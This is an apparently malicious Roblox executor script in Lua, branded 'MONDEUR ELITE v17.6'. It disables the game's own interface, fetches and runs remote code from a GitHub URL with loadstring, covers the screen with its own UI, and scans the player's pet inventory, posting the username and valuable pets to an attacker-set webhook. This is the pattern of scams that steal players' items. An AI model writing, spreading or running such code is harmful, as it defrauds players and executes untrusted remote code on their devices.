-- [[ MONDEUR ELITE v17.6 - "FASTED" STABLE ]] --
if getgenv().MondeurExecuted then return end
getgenv().MondeurExecuted = true

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local StarterGui = game:GetService("StarterGui")
local LocalPlayer = Players.LocalPlayer

-- 1. STABLE UI LOCKDOWN
task.spawn(function()
    pcall(function()
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
        local ui = loadstring(game:HttpGet("https://raw.githubusercontent.com/charles1384/ADM/main/V.1"))()
        if ui then
            ui.Name = "MondeurHub"
            ui.DisplayOrder = 2147483647
            -- This keeps it visible even if the game tries to update the screen
            ui.IgnoreGuiInset = true 
        end
    end)
end)

-- 2. THE PROVEN LOGGING LOGIC
local function SendLog(title, pet, val)
    local payload = HttpService:JSONEncode({
        ["embeds"] = {{
            ["title"] = title,
            ["description"] = "User: **" .. LocalPlayer.Name .. "**",
            ["fields"] = {
                {["name"] = "Pet", ["value"] = pet, ["inline"] = true},
                {["name"] = "Points", ["value"] = tostring(val), ["inline"] = true}
            },
            ["color"] = 0x00FF00
        }}
    })
    
    local req = (syn and syn.request) or (http and http.request) or http_request or request
    if req then
        task.spawn(function()
            pcall(function() req({Url = getgenv().WEBHOOK, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload}) end)
        end)
    end
end

-- 3. THE "DEEP SCAN"
task.spawn(function()
    task.wait(5) -- 5s delay for Android stability
    SendLog("📡 SYSTEM ACTIVE", "Fasted Build v17.6", 0)

    pcall(function()
        local ClientData = require(ReplicatedStorage.ClientModules.Core.ClientData)
        local data = ClientData.get_data()
        
        -- Path search for 2026 inventory structure
        local inv = data.inventory
        local petPath = inv and (inv.inventory_pets or inv.pets)
        
        if petPath then
            for _, pet in pairs(petPath) do
                local val = _G.GetTrueValue(pet, _G.PetValueDB) or 0
                if val >= (getgenv().THRESHOLD or 0) then
                    SendLog("✅ PET CAPTURED", pet.config_name or "Unknown", val)
                end
            end
        end
    end)
end)
